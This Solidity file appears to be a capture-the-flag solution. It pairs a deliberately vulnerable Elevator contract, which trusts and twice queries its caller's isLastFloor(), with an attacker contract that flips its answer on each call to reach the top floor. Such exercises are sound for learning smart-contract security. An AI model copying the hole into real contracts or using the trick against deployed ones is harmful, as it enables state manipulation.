// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract MyBuilding is Building {
    bool public last = true;

    function isLastFloor(uint _n) override external returns (bool) {
        last = !last;
        return last;
    }

    function goToTop(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}